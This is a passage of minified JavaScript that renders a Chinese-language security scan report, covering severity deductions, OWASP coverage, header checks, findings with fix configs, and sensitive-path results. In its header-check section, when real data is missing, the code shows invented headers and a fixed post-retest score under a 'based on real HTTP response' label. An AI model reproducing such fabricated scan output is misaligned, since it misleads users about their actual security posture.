style="font-size:12px;background:rgba(240,167,50,0.15);color:#ea580c;padding:3px 10px;border-radius:2px;font-weight:600">共扣 '+l+" 分</span>",n+="</div>",n+='<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">';let ee=Math.max(A,J,N,U,1);[{label:"严重",count:q.length,deduct:A,color:"#dc2626",bg:"rgba(220,38,38,0.15)"},{label:"高风险",count:te.length,deduct:J,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"中风险",count:B.length,deduct:N,color:"#f0a732",bg:"rgba(240,167,50,0.15)"},{label:"低风险",count:I.length,deduct:U,color:"#73c990",bg:"rgba(115,201,144,0.15)"}].forEach(function(re){let ae=re.count>0?Math.max(re.deduct/ee*100,8):0;n+='<div style="display:flex;align-items:center;gap:10px">',n+='<span style="font-size:12px;color:var(--text-secondary);min-width:48px;font-weight:600">'+re.label+"</span>",n+='<div style="flex:1;height:20px;background:var(--bg-secondary);border-radius:2px;overflow:hidden;position:relative">',n+='<div style="height:100%;width:'+ae+"%;background:"+re.color+';border-radius:2px;transition:width 0.6s ease"></div>',n+='<span style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:700;color:'+(ae>30?"#fff":"var(--text-secondary)")+'">'+re.count+" 项 / -"+re.deduct+"分</span>",n+="</div></div>"}),n+="</div>",n+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:12px 14px">',n+='<div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:8px;display:flex;align-items:center;gap:6px">',n+="<span>修复优先级建议</span>",n+="</div>";let X=[];q.length>0&&X.push('<strong style="color:#dc2626">紧急</strong>：立即修复严重漏洞（'+q.length+"项）"),te.length>0&&X.push('<strong style="color:#f0a732">重要</strong>：优先修复高风险配置问题（'+te.length+"项）"),B.length>0&&X.push('<strong style="color:#ca8a04">常规</strong>：计划修复中风险项（'+B.length+"项）"),I.length>0&&X.push('<strong style="color:#16a34a">可选</strong>：低风险项可按需优化（'+I.length+"项）"),X.length===0&&X.push('<strong style="color:#16a34a">优秀</strong>：未发现明显安全问题'),n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">'+X.join("<br/>")+"</div>",n+="</div>",n+='<details style="margin-top:12px">',n+='<summary style="cursor:pointer;font-size:12px;font-weight:600;color:var(--text-secondary);list-style:none">',n+='<span style="display:inline-flex;align-items:center;gap:6px">',n+='<svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>',n+="查看完整扣分明细",n+="</span></summary>",n+='<div style="margin-top:10px;max-height:240px;overflow-y:auto;padding-right:4px">',q.concat(te,B,I).forEach(function(re,ae){let oe=re.severity==="critical"?"#dc2626":re.severity==="high"?"#f0a732":re.severity==="medium"?"#ca8a04":"#16a34a",ne=re.severity==="critical"?"严重":re.severity==="high"?"高":re.severity==="medium"?"中":"低";n+='<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border-light);font-size:12px">',n+='<div style="display:flex;align-items:center;gap:8px">',n+='<span style="font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;background:'+oe+"20;color:"+oe+'">'+ne+"</span>",n+='<span style="color:var(--text-primary)">'+S(re.item)+"</span>",n+="</div>",n+='<span style="font-weight:700;color:'+oe+'">- '+re.deduction+"</span>",n+="</div>"}),n+="</div></details>",n+="</div>"}let f=e.score||0,v=Math.min(98,f+25),c=i+t,p=Math.max(0,Math.round(c*.25)),h=0,m=0,g=0,y=0;if(e.findings&&(e.findings.forEach(function(l){let A=l.name||"";A.indexOf("缺少")>=0&&A.indexOf("头")>=0&&h++,(A.indexOf("敏感路径")>=0||A.indexOf("目录遍历")>=0||A.indexOf(".env")>=0)&&g++}),m=0,y=Math.max(0,g-2)),n+='<div class="card fade-in-up" style="animation-delay:0.18s">',n+='<div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">',n+='<div class="card-title" style="margin:0">复测前后对比</div>',n+='<span style="font-size:11px;background:rgba(115,201,144,0.15);color:#16a34a;padding:2px 8px;border-radius:2px;font-weight:600">预估</span>',n+="</div>",n+='<div style="overflow-x:auto">',n+='<table style="width:100%;border-collapse:collapse;font-size:13px">',n+='<thead><tr style="border-bottom:1px solid #555555">',n+='<th style="text-align:left;padding:10px 8px;font-weight:600;color:var(--text-secondary)">项目</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测前</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">复测后</th>',n+='<th style="text-align:center;padding:10px 8px;font-weight:600;color:var(--text-secondary)">变化</th>',n+="</tr></thead>",n+="<tbody>",[{label:"安全评分",before:f,after:v,unit:"分",good:"up"},{label:"中高风险",before:c,after:p,unit:"个",good:"down"},{label:"缺失安全头",before:h,after:m,unit:"个",good:"down"},{label:"敏感路径风险",before:g,after:y,unit:"个",good:"down"},{label:"建议处理时间",before:"2 小时",after:"15 分钟",unit:"",good:"down"}].forEach(function(l,A){let J="";if(typeof l.before=="number"&&typeof l.after=="number"){let U=l.after-l.before,q=U>0?"#16a34a":U<0?"#dc2626":"var(--text-secondary)",te=U>0?"+"+U:String(U);J='<span style="color:'+q+';font-weight:700">'+te+"</span>"}else J='<span style="color:#16a34a;font-weight:700">大幅缩短</span>';let N=A%2===0?"transparent":"#313335";n+='<tr style="background:'+N+';border-bottom:1px solid #555555">',n+='<td style="padding:10px 8px;font-weight:600">'+l.label+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-secondary)">'+l.before+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px;color:var(--text-primary);font-weight:700">'+l.after+(l.unit?" "+l.unit:"")+"</td>",n+='<td style="text-align:center;padding:10px 8px">'+J+"</td>",n+="</tr>"}),n+="</tbody></table>",n+="</div>",n+='<p style="margin:12px 0 0 0;font-size:11px;color:var(--text-light);line-height:1.5">提示：以上为基于当前扫描结果的修复预估效果，实际效果取决于修复配置的应用完整度。</p>',n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.12s;text-align:center;padding:20px">',n+='<div class="card-title">安全维度</div>',n+=Cn(e),n+="</div>",n+='<div class="ai-advisor fade-in-up" style="animation-delay:0.15s">',n+='<div class="ai-avatar">顾问</div>',n+='<div class="ai-bubble">',n+='<div class="ai-tag">安全顾问</div>',n+="<p>"+S(e.ai_report.summary)+"</p>",n+='<div class="priority">优先处理：'+S(e.ai_report.priority)+"</div>",n+="</div></div>",n+='<div class="card fade-in-up" style="animation-delay:0.2s">',n+='<div class="card-title">导出</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">发现 '+e.findings.length+" 个问题，导出报告与修复配置</p>",n+='<div style="display:flex;gap:10px;flex-wrap:wrap">',n+=`<button class="fixer-btn primary" onclick="downloadReport('pdf')">下载 PDF 报告</button>`,n+='<button class="fixer-btn secondary" onclick="downloadAllFixes()">导出修复配置包</button>',n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.25s">',n+='<div class="card-title">OWASP Top 10 覆盖</div>',e.owasp_coverage.forEach(function(l){let A=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown",J=l.status==="通过"?"pass":l.status==="高风险"?"fail":l.status==="低风险"?"warn":"unknown";n+='<div class="owasp-item">',n+='<span class="owasp-label">'+S(l.category)+"</span>",n+='<div class="owasp-bar-wrap"><div class="owasp-bar '+J+'"></div></div>',n+='<span class="owasp-status '+A+'">'+S(l.status)+"</span>",n+="</div>"}),n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.28s">',n+='<div class="card-title">响应头检测',n+=' <span style="font-size:12px;color:var(--success);font-weight:400">(基于真实 HTTP 响应)</span>',n+="</div>",n+='<div class="code-block" style="font-size:12px;line-height:2">',e.header_details&&e.header_details.length>0){if(n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",e.raw_headers){let l=e.raw_headers;l.server&&(n+='<div>Server: <span style="color:#f0a732">'+S(l.server)+'</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>'),l["content-type"]&&(n+="<div>Content-Type: "+S(l["content-type"].split(";")[0])+"</div>")}n+='<div style="color:#94a3b8;margin-top:4px">--- Security Headers ---</div>',e.header_details.forEach(function(l){l.status==="present"?n+='<div style="color:var(--success)">'+S(l.name)+": "+S(l.value||"(已配置)")+" [已配置]</div>":l.status==="missing"?n+='<div style="color:var(--danger)">'+S(l.name)+': <span style="color:var(--text-lighter)">[缺失]</span> </div>':l.status==="leak"?n+='<div style="color:#f0a732">'+S(l.name)+': <span style="color:#f0a732">'+S(l.value)+"</span> 信息泄露</div>":l.status==="warning"?n+='<div style="color:#f0a732">'+S(l.name)+': <span style="color:#f0a732">'+S(l.value||"")+"</span> 配置风险</div>":l.status==="not_set"&&(n+='<div style="color:var(--text-lighter)">'+S(l.name)+': <span style="color:var(--text-lighter)">[未设置]</span></div>')})}else n+='<div style="color:#64748b">HTTP/1.1 200 OK</div>',n+='<div>Server: <span style="color:#f0a732">nginx/1.18.0</span> <span style="color:var(--text-lighter)"><- 暴露版本信息</span></div>',n+="<div>Date: "+new Date().toUTCString()+"</div>",n+="<div>Content-Type: text/html; charset=utf-8</div>",e.score>=50?n+='<div style="color:var(--success)">X-Frame-Options: DENY [已配置]</div>':n+='<div style="color:var(--danger)">X-Frame-Options: <span style="color:var(--text-lighter)">[缺失]</span></div>',e.score>=60?n+='<div style="color:var(--success)">X-Content-Type-Options: nosniff </div>':n+='<div style="color:var(--danger)">X-Content-Type-Options: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=70?n+='<div style="color:var(--success)">Strict-Transport-Security: max-age=31536000 </div>':n+='<div style="color:var(--danger)">Strict-Transport-Security: <span style="color:var(--text-lighter)">[缺失]</span> </div>',e.score>=65?n+='<div style="color:var(--success)">Content-Security-Policy: default-src &#x27;self&#x27; </div>':n+='<div style="color:var(--danger)">Content-Security-Policy: <span style="color:var(--text-lighter)">[缺失]</span> </div>';n+="</div></div>",n+='<div class="section-title fade-in-up" style="animation-delay:0.3s">漏洞详情</div>',(!e.findings||e.findings.length===0)&&(n+='<div class="card fade-in-up" style="animation-delay:0.35s;text-align:center;padding:40px 20px;background:#3c3f41;border:1px solid #555555">',n+='<h3 style="margin:0 0 8px;color:#73c990;font-size:16px">安全状况良好</h3>',n+='<p style="color:var(--text-secondary);margin:0 0 16px;font-size:13px;line-height:1.6">当前未发现明显问题。<br/>建议保留结果作为基线，并在版本变更后复测。</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+=`<button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">重新扫描</button>`,n+=`<button onclick="navigateTo('evolution')" style="background:transparent;color:var(--text);border:1px solid var(--border);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px">查看进化中心</button>`,n+="</div></div>"),e.findings.forEach(function(l){if(!l.confidence_level&&typeof l.confidence!="number"){let A=l.name||"";A.indexOf("缺少")===0||A.indexOf("HSTS")>=0||A.indexOf("CSP")>=0||A.indexOf("X-Frame")>=0||A.indexOf("X-Content")>=0||A.indexOf("Referrer")>=0||A.indexOf("Permissions")>=0?(l.confidence_level="高",l.cv_reason="响应头确定性检测"):A.indexOf("敏感路径")>=0||A.indexOf("敏感文件")>=0||A.indexOf("目录")>=0?(l.confidence_level="中",l.cv_reason="HTTP 状态码推断"):A.indexOf("信息泄露")>=0||A.indexOf("Server")>=0||A.indexOf("版本")>=0?(l.confidence_level="高",l.cv_reason="响应头内容匹配"):(l.confidence_level="中",l.cv_reason="启发式检测")}});let k="",x="";if(e.findings.forEach(function(l,A){let J=Xi(l.level),N=e.scan_id||e.id||0,U=e.finding_feedback_map&&e.finding_feedback_map[l.name]||null,q=U&&U.is_false_positive?" fp-marked":"",te=U&&U.is_confirmed?" confirmed":"",B="",I="",ee=l.level||l.severity||"";ee==="严重"||ee==="critical"||ee==="高风险"||ee==="高危"?(B="紧急",I="priority-urgent"):ee==="中风险"||ee==="中危"||ee==="medium"?(B="重要",I="priority-important"):(B="一般",I="priority-normal");let K=J;k+='<div class="result-list-item'+(A===0?" active":"")+'" id="finding-list-'+A+'" onclick="selectFinding('+A+`)" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();selectFinding(`+A+');}">',k+='<div class="finding-name">'+S(l.name)+"</div>",k+='<div class="finding-meta"><span class="severity-dot '+K+'"></span><span>'+S(l.level)+'</span><span class="severity-tag '+I+'">'+B+"</span></div>",k+="</div>",x+='<div class="finding-detail'+(A===0?" active":"")+'" id="finding-detail-'+A+'" data-finding-name="'+S(l.name)+'" data-scan-id="'+N+'">',x+='<div class="finding-detail-header">',x+='<span class="finding-level '+J+'">'+S(l.level)+"</span>",x+='<span class="finding-name">'+S(l.name)+"</span>",x+='<span class="finding-priority '+I+'">'+B+"</span>",U&&U.is_false_positive?x+='<span class="fp-badge">已标记为误报</span>':U&&U.is_confirmed&&(x+='<span class="confirmed-badge">已确认</span>'),x+="</div>",x+='<div class="finding-detail-body">',x+='<div class="finding-section"><h4>问题摘要</h4><p>'+S(l.summary)+"</p></div>",x+='<div class="finding-section"><h4>OWASP 分类</h4><p>'+S(l.owasp)+"</p></div>",l.location&&l.location.target&&(x+='<div class="finding-section" style="background:#313335;border:1px solid #555555;"><h4>漏洞定位</h4>',x+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:6px">',x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px;font-weight:600">'+S(l.location.target)+"</span>",l.location.detail&&(x+='<span style="background:#45494a;color:#bbbbbb;padding:4px 10px;border-radius:2px;font-size:12px">'+S(l.location.detail)+"</span>"),x+="</div></div>"),x+='<div class="finding-section"><h4>智能检查</h4><p>'+S(l.ai_advice).replace(/\n/g,"<br>")+"</p></div>",x+='<div class="finding-section"><h4>建议</h4><p>'+S(l.fix)+"</p></div>";let X="";if(l.evidence&&(l.evidence.header&&l.name.indexOf("缺少")===0?X="命中响应头缺失："+l.evidence.header:l.evidence.reason&&(l.name.indexOf("敏感路径")>=0||l.name.indexOf("敏感文件")>=0)?X="命中内容特征："+l.evidence.reason:l.name.indexOf("robots.txt")>=0||l.name.indexOf("Robots")>=0?X="robots.txt 是公开协议文件，仅作为信息项展示":l.evidence.reason&&(X=l.evidence.reason)),X&&(x+='<div style="margin-top:6px;font-size:12px;color:var(--text-lighter);border-top:1px dashed var(--border);padding-top:6px">判断依据：'+S(X)+"</div>"),l.evidence){let le=ai(l.evidence);le?x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">'+le+"</div></details>":x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>'}if(l.fixes&&Object.keys(l.fixes).length>0){let le=l.fixes,we={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},u=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function($){return le[$]&&le[$].length>0});if(u.length>0){let $=A;x+='<div style="margin-top:8px">',x+='<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">',u.forEach(function(F,_){let w=_===0;x+=`<button onclick="switchFixPlatform('`+F+`', 'finding-fix-')" id="finding-fix-tab-`+F+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(w?"var(--primary)":"var(--border)")+";background:"+(w?"var(--primary)":"transparent")+";color:"+(w?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+we[F]+"</button>"}),x+="</div>",u.forEach(function(F,_){let w=_===0?"block":"none";x+='<div id="finding-fix-content-'+F+'" style="display:'+w+'">',le[F].forEach(function(T,W){let Z=typeof T=="string"?T:T.code||"",O=typeof T=="object"&&T.risk_note||"",V="fix-copy-"+F+"-"+W;x+='<div style="position:relative;margin-bottom:6px">',x+='<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">'+S(Z)+"</pre>",x+=`<button onclick="copyFixCode('`+V+`')" id="`+V+`-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background='#4b6eaf';this.style.color='#fff'" onmouseout="this.style.background='#45494a';this.style.color='#bbbbbb'">复制</button>`,x+='<textarea id="'+V+'" style="position:absolute;left:-9999px">'+S(Z)+"</textarea>",x+="</div>",O&&(x+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">'+S(O)+"</div>")}),x+="</div>"}),x+="</div>"}}if(l.remediation&&(x+='<div class="finding-section"><h4>修复步骤</h4><ul>',(l.remediation.steps||[]).forEach(function(le){x+="<li>"+S(le)+"</li>"}),x+="</ul></div>",l.remediation.nginx&&(x+='<div class="finding-section"><h4>服务器配置</h4><div class="code-block">'+S(l.remediation.nginx)+"</div></div>"),l.remediation.apache&&(x+='<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">'+S(l.remediation.apache)+"</div></div>"),l.remediation.node&&(x+='<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">'+S(l.remediation.node)+"</div></div>"),l.remediation.verify&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+S(l.remediation.verify)+"</p></div>")),l.verify_steps&&l.verify_steps.length>0?(x+='<div class="finding-section">',x+="<h4>验证修复（三步验证法）</h4>",x+='<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">',l.verify_steps.forEach(function(le,we){let u=["1.","2.","3."][we]||we+1+".";x+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">',x+='<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">',x+='<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 '+(we+1)+" 步："+S(le.method||"验证")+"</span>",x+="</div>",le.command&&(x+='<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>',x+='<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+S(le.command)+"</pre>"),le.expect&&(x+='<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">',x+='<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>',x+='<span style="color:var(--text-primary)">'+S(le.expect)+"</span>",x+="</div>"),x+="</div>"}),x+="</div>",x+='<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">',x+="<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。",x+="</div>",x+="</div>"):l.verify_method&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+S(l.verify_method)+"</p></div>"),l.evidence&&Object.keys(l.evidence).length>0){x+='<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">',x+='<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';let le=ai(l.evidence);le?x+=le:x+='<div style="color:var(--text-lighter)">无额外技术细节</div>',x+="</div>"}let ge=l.confidence_level||"",re=typeof l.confidence=="number"?l.confidence:null,ae=l.cv_reason||"",oe="finding-confidence";ge==="高"?oe+=" high":ge==="中"?oe+=" medium":ge==="低"?oe+=" low":re!==null&&(re>=80?oe+=" high":re>=60?oe+=" medium":oe+=" low"),x+='<div class="finding-feedback-row" data-finding-name="'+S(l.name)+'" data-scan-id="'+N+'">',x+='<span style="color:var(--text-light)">置信度</span>',ge?x+='<span class="'+oe+'">'+S(ge)+"</span>":re!==null?x+='<span class="'+oe+'">'+re+"%</span>":x+='<span class="'+oe+'">未评估</span>',ae&&(x+='<span style="font-size:12px;color:var(--text-lighter)">· '+S(ae)+"</span>"),(l.review_required||ge==="中")&&(x+='<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">建议复核</span>');let ne=U&&(U.is_false_positive||U.is_confirmed)?" disabled":"";x+=`<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, '`+xe(l.name)+"', "+N+', false)" '+ne+">准确</button>",x+=`<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, '`+xe(l.name)+"', "+N+', true)" '+ne+">误报</button>",U&&U.is_false_positive?x+='<span class="fp-reason-text">已标记为误报，将用于优化后续检测</span>':U&&U.is_confirmed&&(x+='<span class="fp-reason-text" style="color:#73c990">已确认为真实问题，感谢您的反馈</span>'),x+="</div>",x+="</div></div>"}),e.findings&&e.findings.length>0&&(n+='<div class="result-workbench">',n+='<div class="result-list-panel"><div class="result-list-header">发现项（'+e.findings.length+')</div><div class="result-list">'+k+"</div></div>",n+='<div class="result-detail-panel" id="result-detail-panel">'+x+"</div>",n+="</div>"),e.fixes&&Object.keys(e.fixes).length>0){let l=e.fixes,A={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},N=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function(U){return l[U]&&l[U].length>0});N.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">',n+='<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 建议（'+N.length+" 种平台）</div>",n+='<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">',N.forEach(function(U,q){let te=q===0;n+=`<button onclick="switchFixPlatform('`+U+`')" id="fix-tab-`+U+'" style="padding:6px 14px;border-radius:2px;border:1px solid '+(te?"var(--primary)":"var(--border)")+";background:"+(te?"var(--primary)":"transparent")+";color:"+(te?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+A[U]+"</button>"}),n+="</div>",N.forEach(function(U,q){let te=q===0?"block":"none";n+='<div id="fix-content-'+U+'" style="display:'+te+'">',l[U].forEach(function(B){let I=typeof B=="string"?B:B.code||"",ee=typeof B=="object"&&B.risk_note||"";n+='<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">'+S(I)+"</pre>",ee&&(n+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">'+S(ee)+"</div>")}),n+="</div>"}),n+="</div>")}n+='<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">',n+="<h3> 一键生成修复配置</h3>",n+='<p class="card-desc" style="margin-bottom:14px">输入您的配置，系统将根据扫描结果生成可直接参考的建议</p>',n+='<div class="gen-fix-row">',n+='<input type="text" id="gen-fix-input" placeholder="粘贴配置或输入 server 块..." />',n+='<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>',n+="</div>",n+='<div id="gen-fix-output"></div>',n+="</div>";let C=Math.min(100,112);if(n+='<div class="score-compare fade-in-up" style="animation-delay:0.45s">',n+="<h3> 复测后评分对比</h3>",n+='<div class="score-rings">',n+='<div class="score-ring-item">',n+='<div class="ring" style="background:'+jt(e.score)+'">',n+='<div class="val" style="color:#fff">'+e.score+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测前</div>',n+="</div>",n+='<div class="tag">复测前</div>',n+="</div>",n+='<div class="score-ring-item">',n+='<div class="ring" id="score-after-ring" style="background:'+jt(C)+'">',n+='<div class="val" style="color:#fff">'+C+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测后</div>',n+="</div>",n+='<div class="tag">复测后</div>',n+="</div>",n+="</div>",n+='<div class="score-improve" id="score-diff"> 提升 <strong>'+(C-e.score)+"</strong> 分 <span>（"+e.score+" -> "+C+"）</span></div>",n+='<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + PR修复(+10)</p></div>',n+="</div>",e.ssl_info&&e.ssl_info.has_cert){n+='<div class="card fade-in-up" style="animation-delay:0.32s">',n+='<div class="card-title"> SSL 证书信息</div>';let l=e.ssl_info;n+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">',n+='<div><span style="color:var(--text-lighter)">域名:</span> '+S(l.subject||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">签发机构:</span> '+S(l.issuer||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">TLS 版本:</span> '+S(l.version||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">密码套件:</span> '+S(l.cipher||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">剩余天数:</span> '+(l.days_left!=null?l.days_left+" 天":"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">过期时间:</span> '+S(l.not_after||"N/A")+"</div>",l.san&&l.san.length>0&&(n+='<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> '+S(l.san.join(", "))+"</div>"),n+="</div>",l.expired?n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">证书已过期！</div>':l.days_left!=null&&l.days_left<30&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">证书将在 '+l.days_left+" 天后过期</div>"),l.weak&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">使用弱加密协议/套件</div>'),n+="</div>"}if(e.waf&&e.waf.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.34s">',n+='<div class="card-title"> WAF 防护检测</div>',n+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">',e.waf.forEach(function(l){n+='<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">'+S(l.name)+"</span>"}),n+="</div>",n+='<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">',n+="WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。",n+="</div>",n+="</div>"),e.sensitive_paths&&e.sensitive_paths.length>0){let l=e.sensitive_paths.filter(function(U){return U.exposed}),A=e.sensitive_paths.filter(function(U){return U.suspect}),J=e.sensitive_paths.filter(function(U){return U.info}),N=e.sensitive_paths.filter(function(U){return!U.exposed&&!U.suspect&&!U.info});n+='<div class="card fade-in-up" style="animation-delay:0.36s">',n+='<div class="card-title"> 敏感路径探测</div>',l.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 ('+l.length+")</div>",n+='<div style="font-size:12px;line-height:2">',l.forEach(function(U){n+='<div style="color:var(--danger)">'+S(U.path)+' <span style="color:var(--text-lighter)">['+U.status+"]</span>  已暴露 ("+(U.size||"-")+" bytes)</div>"}),n+="</div></div>"),A.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">疑似风险 ('+A.length+")</div>",n+='<div style="font-size:12px;line-height:2">',A.forEach(function(U){n+='<div style="color:var(--warning)">'+S(U.path)+' <span style="color:var(--text-lighter)">['+U.status+"]</span> "+S(U.reason||"疑似误报，需复核")+"</div>"}),n+="</div></div>"),J.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 ('+J.length+")</div>",n+='<div style="font-size:12px;line-height:2">',J.forEach(function(U){n+='<div style="color:#4b6eaf">'+S(U.path)+' <span style="color:var(--text-lighter)">['+U.status+"]</span> 信息： 公开信息</div>"}),n+="</div></div>"),N.length>0&&(n+='<div style="font-size:12px;line-height:2">',N.forEach(function(U){U.protected?n+='<div style="color:var(--success)">'+S(U.path)+' <span style="color:var(--text-lighter)">['+U.status+"]</span>  已保护</div>":n+='<div style="color:var(--text-lighter)">'+S(U.path)+' <span style="color:var(--text-lighter)">['+U.status+"]</span></div>"}),n+="</div>"),n+="</div>"}if(e.crawled_pages&&e.crawled_pages.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.38s">',n+='<div class="card-title"> 爬取页面 ('+e.crawled_pages.length+" 页)</div>",n+='<div 